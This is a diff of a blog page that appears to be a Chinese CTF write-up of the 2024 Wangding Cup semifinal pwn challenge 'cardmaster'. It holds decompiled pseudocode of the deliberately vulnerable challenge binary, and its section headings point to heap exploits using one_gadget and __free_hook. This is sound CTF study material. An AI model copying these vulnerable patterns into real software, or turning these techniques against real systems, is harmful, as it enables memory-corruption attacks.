@@ -1,8 +1,6 @@
-<!DOCTYPE html>
-<html lang="zh-cn">
-<head>
+<!DOCTYPE html><html lang="zh-cn"><head>
   <meta charset="utf-8">
-  <title>2024网鼎杯半决赛 cardmaster | shanza's hideout</title>
+  <title>2024网鼎杯半决赛 cardmaster | shanza's blog</title>
   <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="keywords" content="">
@@ -12,12 +10,12 @@
 
   
 
-  <meta name="description" content="题目伪代码结构体定义 struct list_content &#123;   unsigned __int64 out_idx;&#x2F;&#x2F; 牌的花色和数字   unsigned __int64 in_idx; &#125;;  struct list &#123;   struct list_content *content[13]; &#125;;  struct cards &#123;   in">
+  <meta name="description" content="题目伪代码结构体定义 struct list_content {   unsigned __int64 out_idx;// 牌的花色和数字   unsigned __int64 in_idx; };  struct list {   struct list_content *content[13]; };  struct cards {   in">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2024网鼎杯半决赛 cardmaster">
 <meta property="og:url" content="https://shanzade.github.io/2025/10/28/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-cardmaster/index.html">
-<meta property="og:site_name" content="shanza&#39;s hideout">
-<meta property="og:description" content="题目伪代码结构体定义 struct list_content &#123;   unsigned __int64 out_idx;&#x2F;&#x2F; 牌的花色和数字   unsigned __int64 in_idx; &#125;;  struct list &#123;   struct list_content *content[13]; &#125;;  struct cards &#123;   in">
+<meta property="og:site_name" content="shanza's blog">
+<meta property="og:description" content="题目伪代码结构体定义 struct list_content {   unsigned __int64 out_idx;// 牌的花色和数字   unsigned __int64 in_idx; };  struct list {   struct list_content *content[13]; };  struct cards {   in">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-10-28T11:50:43.000Z">
 <meta property="article:modified_time" content="2025-10-28T11:58:15.576Z">
@@ -25,7 +23,7 @@
 <meta name="twitter:card" content="summary">
   <meta name="generator" content="Hexo 7.3.0">
   <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://shanzade.github.io/2025/10/28/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-cardmaster/"},"headline":"2024网鼎杯半决赛 cardmaster","description":"题目伪代码结构体定义 struct list_content &#123;   unsigned __int64 out_idx;// 牌的花色和数字   unsigned __int64 in_idx; &#125;; struct list &#123;   struct list_content *content","datePublished":"2025-10-28T11:50:43.000Z","dateModified":"2025-10-28T11:58:15.576Z","author":{"@type":"Person","name":"shanza"},"publisher":{"@type":"Organization","name":"shanza's hideout","logo":{"@type":"ImageObject","url":"https://shanzade.github.io/favicon.ico"}}}
+{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://shanzade.github.io/2025/10/28/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-cardmaster/"},"headline":"2024网鼎杯半决赛 cardmaster","description":"题目伪代码结构体定义 struct list_content &#123;   unsigned __int64 out_idx;// 牌的花色和数字   unsigned __int64 in_idx; &#125;; struct list &#123;   struct list_content *content","datePublished":"2025-10-28T11:50:43.000Z","dateModified":"2025-10-28T11:58:15.576Z","author":{"@type":"Person","name":"shanza"},"publisher":{"@type":"Organization","name":"shanza's blog","logo":{"@type":"ImageObject","url":"https://shanzade.github.io/favicon.ico"}}}
 </script>
 
   
@@ -42,7 +40,116 @@
   
 <script src="/js/theme_mode.js"></script>
 
-<!-- hexo injector head_end start --><style id="custom-font">
+<!-- hexo injector head_end start -->
+<style>
+#toc-list a{
+  text-decoration: none;
+  color:#333 !important;
+}
+#toc-desktop ul{
+  list-style: none;
+  padding-left: 3px;
+}
+
+/* 展开状态 */
+#toc-desktop {
+  position: fixed;
+  right: 0;
+  top: 0;
+  height: 100vh;
+  width: 260px;
+
+  padding: 10px;
+
+  background: #fff;
+  border-left: 1px solid #ddd;
+
+  /* 关键：动画 */
+  transition: transform 0.25s ease;
+  will-change: transform;
+
+  color:#333;
+  font-size:1rem;
+  z-index: 9999;
+
+  display: flex;
+  flex-direction: column;
+  transform: translateX(0);
+}
+
+/* 收起状态：只露出 toggle */
+#toc-desktop.collapsed {
+  transform: translateX(calc(100%));
+}
+
+/* toggle 固定在可见边缘 */
+#toc-toggle {
+  position: absolute;
+  left: -30px;
+  top: 50%;
+  width: 80px;
+  height: 80px;
+  transform: translateY(-50%);
+  cursor: pointer;
+  user-select: none;
+  background: #fff;
+  border-left: 2px solid #ddd;
+  color: #333;
+  border-radius: 20%;
+  z-index:-1;
+  font-size: 25px;
+  font-weight: bold;
+
+  display: flex;
+  align-items: center;
+  justify-content: left;
+  
+  padding:5px;
+}
+
+#toc-list {
+  flex: 1;
+  overflow-y: auto;/* 关键：滚动 */
+  overflow-x: hidden;
+  margin-left:5%;
+}
+#toc-mobile {
+  display: none;
+}
+
+/* indentation */
+.toc-lv-2 { margin-left: 12px; }
+.toc-lv-3 { margin-left: 24px; }
+.toc-lv-4 { margin-left: 36px; }
+
+#toc-title{
+  font-weight: bold;
+  font-size: 1.2rem;
+  margin:10px auto;
+}
+@media (max-width: 1024px) {
+  #toc-desktop {
+    display: none;
+  }
+
+  #toc-mobile {
+    display: block;
+    width: 100%;
+    height: auto;
+    padding: 5%;
+    border-bottom: 1px solid #eee;
+    background: #fafafa;
+  }
+  #toc-mobile li{
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+}
+</style>
+
+
+  <style id="custom-font">
   @font-face {
     font-family: "Montserrat";
     src: url("/fonts/Montserrat-Regular.woff2") format("woff2");
@@ -117,7 +224,7 @@
   <header class="sea-header">
     <nav class="sea-nav-wrap">
   <div class="sea-nav-logo" title="">
-    <a href="/">shanza's hideout</a>
+    <a href="/">shanza's blog</a>
   </div>
   <div class="sea-nav-menus">
     <div id="sea-nav-toggle">
@@ -127,35 +234,19 @@
     <div id="sea-nav-dimmer"></div>
 <div class="sea-menu-wrap">
   
-    <a
-      class="sea-menu-link "
-      
-      href="/posts/"
-    >
+    <a class="sea-menu-link " href="/posts/">
       所有文章
     </a>
   
-    <a
-      class="sea-menu-link "
-      
-      href="/categories/"
-    >
+    <a class="sea-menu-link " href="/categories/">
       分类
     </a>
   
-    <a
-      class="sea-menu-link "
-      
-      href="/tags/"
-    >
+    <a class="sea-menu-link " href="/tags/">
       标签
     </a>
   
-    <a
-      class="sea-menu-link "
-      
-      href="/archives/"
-    >
+    <a class="sea-menu-link " href="/archives/">
       归档
     </a>
   
@@ -178,10 +269,89 @@
   </div>
 </nav>
   </header>
-  <main id="sea-main-wrapper" data-pagefind-body>
+  <div id="toc-mobile">
+    <div id="toc-title">Contents</div>
+    <ul id="toc-list-mobile">
+      
+        <li class="toc-lv-1">
+          <a href="#heading-0">2024网鼎杯半决赛 cardmaster</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#题目伪代码">题目伪代码</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#15mins-初步猜测">15mins 初步猜测</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#wp-复现">wp 复现</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#exp1：修改堆上指针为-one-gadget">exp1：修改堆上指针为 one_gadget</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#exp2：打-freehook">exp2：打 freehook</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#总结">总结</a>
+        </li>
+      
+        <li class="toc-lv-1">
+          <a href="#参考文章">参考文章</a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div id="toc-desktop" class="collapsed">
+      <div id="toc-toggle">&gt;</div>
+      <div id="toc-title">Contents</div>
+      <ul id="toc-list">
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#heading-0">2024网鼎杯半决赛 cardmaster</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#题目伪代码">题目伪代码</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#15mins-初步猜测">15mins 初步猜测</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#wp-复现">wp 复现</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#exp1：修改堆上指针为-one-gadget">exp1：修改堆上指针为 one_gadget</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#exp2：打-freehook">exp2：打 freehook</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#总结">总结</a>
+          </li>
+        
+          <li class="toc-item toc-lv-1">
+            <a href="#参考文章">参考文章</a>
+          </li>
+        
+      </ul>
+    </div>
+  
+  <main id="sea-main-wrapper" data-pagefind-body="">
     <article class="sea-page-card-wrapper">
   <header class="sea-article-header">
-    <h1 class="sea-article-title">2024网鼎杯半决赛 cardmaster</h1>
+    <h1 class="sea-article-title" id="heading-0">2024网鼎杯半决赛 cardmaster</h1>
     
       <div class="sea-post-meta sea-post-meta__center">
         <div class="sea-post-time">
@@ -204,29 +374,29 @@
     <div class="sea-article-content">
       <h1 id="题目伪代码"><a href="#题目伪代码" class="headerlink" title="题目伪代码"></a>题目伪代码</h1><p>结构体定义</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">list_content</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">unsigned</span> __int64 out_idx<span class="token punctuation">;</span><span class="token comment">// 牌的花色和数字</span>
   <span class="token keyword">unsigned</span> __int64 in_idx<span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
 
 <span class="token keyword">struct</span> <span class="token class-name">list</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">struct</span> <span class="token class-name">list_content</span> <span class="token operator">*</span>content<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
 
 <span class="token keyword">struct</span> <span class="token class-name">cards</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">int</span> count<span class="token punctuation">;</span>
   <span class="token keyword">int</span> range<span class="token punctuation">;</span>
   <span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span>random_lvl_ptr<span class="token punctuation">;</span>
   <span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span>ptr_record<span class="token punctuation">;</span>
   <span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span>get_callback<span class="token punctuation">;</span>
   <span class="token keyword">struct</span> <span class="token class-name">list</span> <span class="token operator">*</span>list_ptr<span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><code>main</code></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">int</span> choice<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-14h] BYREF</span>
   <span class="token keyword">struct</span> <span class="token class-name">cards</span> <span class="token operator">*</span>structs<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h]</span>
   <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>
@@ -237,22 +407,22 @@
   <span class="token function">sub_BBD</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   structs <span class="token operator">=</span> <span class="token function">init_C0C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
-  <span class="token punctuation">&#123;</span>
+  <span class="token punctuation">{</span>
     <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">{</span>
       <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf_<span class="token punctuation">,</span> <span class="token number">3u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
         <span class="token keyword">break</span><span class="token punctuation">;</span>
       structs <span class="token operator">=</span> <span class="token function">init_C0C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">}</span>
     <span class="token keyword">switch</span> <span class="token punctuation">(</span> choice <span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">{</span>
       <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
         <span class="token function">set_115A</span><span class="token punctuation">(</span>structs<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">break</span><span class="token punctuation">;</span>
       <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
-        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cards</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>structs<span class="token operator">-></span>get_callback<span class="token punctuation">)</span><span class="token punctuation">(</span>structs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// get</span>
+        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cards</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>structs<span class="token operator">-&gt;</span>get_callback<span class="token punctuation">)</span><span class="token punctuation">(</span>structs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// get</span>
         <span class="token keyword">break</span><span class="token punctuation">;</span>
       <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
         <span class="token function">shuffle</span><span class="token punctuation">(</span>structs<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -263,41 +433,41 @@
       <span class="token keyword">default</span><span class="token operator">:</span>
         <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invalid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-  <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><code>init</code></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cards</span> <span class="token operator">*</span><span class="token function">init_C0C</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">struct</span> <span class="token class-name">list_content</span> <span class="token operator">*</span><span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
   <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h]</span>
   <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-1Ch]</span>
   <span class="token keyword">struct</span> <span class="token class-name">cards</span> <span class="token operator">*</span>cards<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h]</span>
 
   cards <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cards</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  cards<span class="token operator">-></span>list_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  cards<span class="token operator">-&gt;</span>list_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
-  <span class="token punctuation">&#123;</span>
-    v0 <span class="token operator">=</span> <span class="token operator">&amp;</span>cards<span class="token operator">-></span>list_ptr<span class="token operator">-></span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token punctuation">{</span>
+    v0 <span class="token operator">=</span> <span class="token operator">&amp;</span>cards<span class="token operator">-&gt;</span>list_ptr<span class="token operator">-&gt;</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token operator">*</span>v0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_content</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xD0u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">12</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-      cards<span class="token operator">-></span>list_ptr<span class="token operator">-></span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>out_idx <span class="token operator">=</span> i<span class="token punctuation">;</span>
-      cards<span class="token operator">-></span>list_ptr<span class="token operator">-></span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>in_idx <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-  <span class="token punctuation">&#125;</span>
-  cards<span class="token operator">-></span>count <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
-  cards<span class="token operator">-></span>range <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>
-  cards<span class="token operator">-></span>ptr_record <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202010<span class="token punctuation">;</span>
-  cards<span class="token operator">-></span>get_callback <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span>sub_D31<span class="token punctuation">;</span>
-  cards<span class="token operator">-></span>random_lvl_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>qword_318 <span class="token operator">+</span> <span class="token number">208</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0x3e8</span>
+    <span class="token punctuation">{</span>
+      cards<span class="token operator">-&gt;</span>list_ptr<span class="token operator">-&gt;</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>out_idx <span class="token operator">=</span> i<span class="token punctuation">;</span>
+      cards<span class="token operator">-&gt;</span>list_ptr<span class="token operator">-&gt;</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>in_idx <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+  cards<span class="token operator">-&gt;</span>count <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
+  cards<span class="token operator">-&gt;</span>range <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>
+  cards<span class="token operator">-&gt;</span>ptr_record <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202010<span class="token punctuation">;</span>
+  cards<span class="token operator">-&gt;</span>get_callback <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span>sub_D31<span class="token punctuation">;</span>
+  cards<span class="token operator">-&gt;</span>random_lvl_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>qword_318 <span class="token operator">+</span> <span class="token number">208</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0x3e8</span>
   <span class="token keyword">return</span> cards<span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><code>setinfo</code></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> __fastcall <span class="token function">set_115A</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cards</span> <span class="token operator">*</span>obj<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
   <span class="token class-name">ssize_t</span> count1<span class="token punctuation">;</span> <span class="token comment">// rax</span>
   <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>
@@ -307,51 +477,51 @@
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit count:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"digit range 1 - ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>obj<span class="token operator">-></span>range<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>obj<span class="token operator">-&gt;</span>range<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"randomize level:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>obj<span class="token operator">-></span>random_lvl_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_UNKNOWN <span class="token operator">*</span><span class="token punctuation">)</span>obj<span class="token operator">-></span>ptr_record <span class="token operator">==</span> <span class="token operator">&amp;</span>unk_202010 <span class="token punctuation">)</span>
-    random_lvl_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> obj<span class="token operator">-></span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>obj<span class="token operator">-&gt;</span>random_lvl_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_UNKNOWN <span class="token operator">*</span><span class="token punctuation">)</span>obj<span class="token operator">-&gt;</span>ptr_record <span class="token operator">==</span> <span class="token operator">&amp;</span>unk_202010 <span class="token punctuation">)</span>
+    random_lvl_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> obj<span class="token operator">-&gt;</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">else</span>
-    random_lvl_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>obj<span class="token operator">-></span>ptr_record<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> obj<span class="token operator">-></span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  obj<span class="token operator">-></span>list_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>obj<span class="token operator">-></span>list_ptr<span class="token punctuation">,</span> <span class="token number">8LL</span> <span class="token operator">*</span> obj<span class="token operator">-></span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    random_lvl_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>obj<span class="token operator">-&gt;</span>ptr_record<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> obj<span class="token operator">-&gt;</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
